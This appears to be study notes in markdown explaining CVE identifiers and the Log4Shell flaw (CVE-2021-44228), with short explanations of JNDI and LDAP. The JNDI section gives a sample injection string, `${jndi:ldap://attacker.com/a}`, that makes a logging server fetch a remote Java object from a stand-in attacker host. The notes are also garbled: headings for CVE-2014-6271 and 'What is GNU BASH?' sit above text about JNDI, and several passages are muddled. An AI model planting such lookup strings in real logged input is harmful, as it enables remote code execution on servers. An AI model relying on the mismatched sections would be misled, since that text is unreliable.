> CVE is short for `Common Vulnerabilities and Exposures.` It means publicly known information-security vulnerabilities in publicly released software packages. The informaion is then assigend a CVE ID by a CVE Numbering Authority, CNA. CVEs help IT organizations to more systematically identify security flaws and compensate for vulnerabilities. And it consists of a structure in the order of prefix, year, and numbering.

>**The Log4j vulnerability CVE-2021-44228, aka “Log4Shell.”** When Log4Shell outputs the log, the log is not only written with message data, but also automatically accesses the directory service using JNDI. By doing so, It may provide a function of converting to a name or downloading a Java object. The attacker exploits this function to connect the victim server to the attacker server to download malicious Java objects. As a result, the malicious code can be used to steal server privileges.

### CVE-2014-6271 `RCE: Remote Code Execution Vulnerability`


## 🔎 What is GNU BASH ?

> JNDI is short for Java Naming and Directory Interface. It provides an API for applications to interact with remote objects registered with the RMI registry or directory services like LDAP. JNDI has a number of service provider interfaces (SPIs) that enable it to use a variety of directory service like RMI(Remote Method),CORBRA(Common Object Request Broket Architecture), LDAP(Lightweight Directory Access Protocol), and DNS(Domain Name Service). For example, if we access the URL `ldap://localhost:3389/o=test`, then we can find the 'test' object on the LDAP server. When we do this Jndi Lookup, This is because Java class files can be downloaded and executed without verifying the unsafe(hostile) server. Eventually, if the attacker finds out where it is logged, then just add a value like `${jndi:ldap://attacker.com/a}`. Vulnerabilities can be exploited.

> LDAP is short for Lightweight Directory Access Protocol. LDAP is application protocol for accessing and modifying directory services. one of the disadvantages of RDBMS is Lack of Speed. LDAP is used to compensate for the problem often. also, LDAP is suitable for roles that not update frequently and require a lot of search requests. + It is mainly used for other services for authentication(and authorization).
